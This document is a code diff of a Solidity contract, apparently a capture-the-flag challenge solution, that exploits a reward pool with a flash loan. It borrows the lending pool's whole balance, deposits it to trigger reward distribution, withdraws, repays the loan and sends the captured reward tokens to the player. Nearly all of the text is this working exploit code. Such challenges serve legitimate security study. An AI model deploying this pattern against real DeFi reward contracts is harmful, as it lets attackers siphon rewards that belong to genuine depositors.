@@ -1,51 +1,53 @@
-// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
-interface IFlashLoanerPool{
-     function flashLoan(uint256 amount) external;
+interface IFlashloanPool {
+    function flashLoan(uint256 amount) external;
 }
 
-interface IRewarderPool{
-     function deposit(uint256 amount) external;
-     function withdraw(uint256 amount) external;
-     function distributeRewards() external returns(uint256);
+interface IRewardPool {
+    function deposit(uint256 amount) external;
+    function distributeRewards() external returns (uint256 rewards);
+    function withdraw(uint256 amount) external;
 }
 
 contract AttackTheRewarder {
 
-    IFlashLoanerPool immutable flashLoanPool;
-    IRewarderPool immutable rewarderPool;
+    IFlashloanPool immutable flashLoanPool;
+    IRewardPool immutable rewardPool;
     IERC20 immutable liquidityToken;
     IERC20 immutable rewardToken;
     address immutable player;
 
-    constructor(address _flashLoanPool, address _rewarderPool, address _player, address _liquidityToken, address _rewardToken) {
-        player = _player;
-        flashLoanPool = IFlashLoanerPool(_flashLoanPool);
+    constructor(
+        address _flashloanPool, address _rewardPool, address _liquidityToken, address _rewardToken
+    ){
+        flashLoanPool = IFlashloanPool(_flashloanPool);
+        rewardPool = IRewardPool(_rewardPool);
         liquidityToken = IERC20(_liquidityToken);
-        rewarderPool = IRewarderPool(_rewarderPool);
         rewardToken = IERC20(_rewardToken);
+        player = msg.sender;
     }
 
     function attack() external {
-        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));        
+        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));
     }
+
 
     function receiveFlashLoan(uint256 amount) external {
-        require(msg.sender == address(flashLoanPool), "not pool");
-        require(tx.origin == player, "not player");
+        require(msg.sender == address(flashLoanPool));
+        require(tx.origin == player);
 
         // Deposit --> Get Rewards --> Withdraw
-        uint256 balance = liquidityToken.balanceOf(address(this));
-        liquidityToken.approve(address(rewarderPool), balance);
-        rewarderPool.deposit(balance);
-        rewarderPool.distributeRewards();
-        rewarderPool.withdraw(balance);
+        liquidityToken.approve(address(rewardPool), amount);
+        rewardPool.deposit(amount);
+        rewardPool.distributeRewards();
+        rewardPool.withdraw(amount);
 
-        // // Pay back flashloan and send rewards to player
-        liquidityToken.transfer(address(flashLoanPool), balance);
+        // Pay back the loan & send reward tokens to player
+        liquidityToken.transfer(address(flashLoanPool), amount);
         rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
     }
+
 }
